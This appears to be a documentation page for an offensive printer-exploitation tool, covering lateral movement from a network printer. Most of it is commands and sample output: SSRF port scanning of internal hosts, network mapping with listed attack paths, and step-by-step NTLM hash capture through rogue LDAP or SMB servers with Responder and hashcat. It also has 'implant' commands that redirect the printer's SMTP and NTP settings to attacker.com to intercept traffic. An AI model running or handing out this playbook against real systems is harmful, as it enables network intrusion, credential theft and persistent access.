# Lateral Movement

Use the printer as a pivot point to reach internal network segments that are otherwise inaccessible from the attacker's position.

---

## SSRF via IPP/WSD

The `--pivot` flag detects SSRF vectors by sending IPP and WSD print requests pointing to internal hosts and measuring the response.

```bash
# Detect SSRF vectors and enumerate reachable internal hosts
python printer-reaper.py 192.168.1.100 --pivot

# Port-scan a specific internal host via printer SSRF
python printer-reaper.py 192.168.1.100 --pivot-scan 10.0.0.1
python printer-reaper.py 192.168.1.100 --pivot-scan 192.168.1.1
python printer-reaper.py 192.168.1.100 --pivot-scan 172.16.0.10
```

**How it works:**
1. PrinterReaper sends an IPP `Print-Job` request with the job URI pointing to an internal IP (e.g. `ipp://10.0.0.1/ipp`)
2. The printer's IPP implementation will attempt to connect to that IP
3. Differences in response time and error codes reveal whether the internal host is reachable from the printer's network segment
4. WSD uses the same technique via the `wsd:Print` operation

**Pivot scan output:**
```
[PIVOT] SSRF scan of 10.0.0.1 via 192.168.1.100 ...

  Port 22   (ssh)   : OPEN   (response time: 120ms)
  Port 80   (http)  : OPEN   (response time: 95ms)
  Port 443  (https) : OPEN   (response time: 98ms)
  Port 445  (smb)   : CLOSED (timeout: 5000ms)
  Port 3389 (rdp)   : FILTERED

[PIVOT] Reachable hosts on 10.0.0.0/24:
  10.0.0.1   OPEN (gateway — 22, 80, 443)
  10.0.0.10  OPEN (server — 22, 3306)
  10.0.0.20  OPEN (workstation — 80, 445)
```

---

## Full Network Map

Build a complete map of the network from the printer's vantage point.

```bash
python printer-reaper.py 192.168.1.100 --network-map
```

**Data sources used:**
- SNMP routing table (`ipRouteTable` OID 1.3.6.1.2.1.4.21)
- SNMP ARP cache (`ipNetToMediaTable` OID 1.3.6.1.2.1.4.22)
- PJL network variables (`@PJL INFO VARIABLES`)
- HTTP EWS network configuration page
- WSD neighbor discovery (UDP multicast 3702)
- Active subnet scan via SSRF (IPP/WSD)

**Full output:**
```
====================================================================
NETWORK MAP — from 192.168.1.100 (EPSON L3250) perspective
====================================================================

[SNMP] Routing Table:
  0.0.0.0/0        via 192.168.1.1   (default gateway)
  192.168.1.0/24   via eth0

[SNMP] ARP Cache:
  192.168.1.1    aa:bb:cc:dd:ee:01  (gateway)
  192.168.1.10   11:22:33:44:55:10  (workstation)
  192.168.1.20   11:22:33:44:55:20  (server)
  192.168.1.50   11:22:33:44:55:50  (printer 2)

[PJL] Network Variables:
  IP=192.168.1.100  SUBNET=255.255.255.0  GATEWAY=192.168.1.1
  DNS=8.8.8.8  NTP=pool.ntp.org  WINS=192.168.1.1
  MAC=AA:BB:CC:DD:EE:FF

[EWS] Additional config:
  SMTP Server: smtp.company.internal  (used for scan-to-email)
  LDAP Server: ldap.company.internal  (used for address book)
  SMB Share  : \\fileserver\scans     (used for scan-to-folder)

[SUBNET SCAN] 192.168.1.0/24 via SSRF (60 threads)
  192.168.1.1    open: 22, 80, 443
  192.168.1.10   open: 80, 445, 3389
  192.168.1.20   open: 22, 80, 3306
  192.168.1.50   open: 9100, 631, 80   (PRINTER)

[WSD] Neighbor Devices: 2 found
  192.168.1.50   HP LaserJet Pro M404n
  192.168.1.1    ROUTER-A1-corp

[ATTACK PATHS]
  192.168.1.1   via 22/ssh, 80/http      (default creds possible)
  192.168.1.10  via 445/smb, 3389/rdp    (Pass-the-Hash via NTLM capture)
  192.168.1.20  via 3306/mysql           (default creds possible)
  192.168.1.50  via 9100/raw, 631/ipp    (second printer, full attack surface)
```

---

## LDAP/AD NTLM Hash Capture

Many enterprise printers are configured to authenticate against Active Directory via LDAP for scan-to-email and address book lookups. PrinterReaper exploits this by redirecting the printer's LDAP server configuration to a rogue LDAP server (Responder), capturing the machine account NTLM hash.

```bash
# Step 1 — Check if printer has LDAP integration configured
python printer-reaper.py 192.168.1.100 --xpl-check research-ldap-hash-capture

# Output (if vulnerable):
# [+] VULNERABLE: LDAP server configured at ldap.company.internal
#     Authentication type: Simple Bind with credentials
#     Username: scanner@company.internal

# Step 2 — On your attacker machine, start Responder:
# sudo responder -I eth0 -wrf
# (listens on port 389 for LDAP, captures NTLM hashes)

# Step 3 — Redirect printer's LDAP config to attacker IP (dry-run shows payload)
python printer-reaper.py 192.168.1.100 --xpl-run research-ldap-hash-capture

# Step 4 — Live: redirect to rogue LDAP server
python printer-reaper.py 192.168.1.100 --xpl-run research-ldap-hash-capture --no-dry
# (prompts for rogue server IP)

# Step 5 — When the printer next triggers an LDAP lookup (scan job, address book):
# Responder captures: DOMAIN\scanner::COMPANY:NTLMhash...

# Step 6 — Crack with hashcat
# hashcat -m 5600 ntlm.txt rockyou.txt --force
```

**Affected vendors:** HP, Xerox, Ricoh, Canon, Konica Minolta, Sharp, Kyocera

---

## Persistent Config Implant

Change printer's server configuration to persist access or redirect traffic:

```bash
# Change SMTP relay (intercept all scan-to-email traffic)
python printer-reaper.py 192.168.1.100 --implant smtp_host=attacker.com

# Change DNS server
python printer-reaper.py 192.168.1.100 --implant dns=8.8.8.8

# Change SNMP community string
python printer-reaper.py 192.168.1.100 --implant snmp_community=hacked

# Change NTP server (time-based attacks)
python printer-reaper.py 192.168.1.100 --implant ntp=attacker.com
```

---

## SMB Hash Capture via Scan-to-Folder

If the printer is configured for scan-to-SMB-folder:

1. Identify the SMB share path from the EWS config or SNMP (`--network-map` reveals it)
2. Point the scan destination to a rogue SMB server running Responder
3. Trigger a scan job (physical button press or IPP job submission)
4. Responder captures the NTLM hash of the service account

This technique is detailed in the BlackHat 2017 paper (Section 5.2).
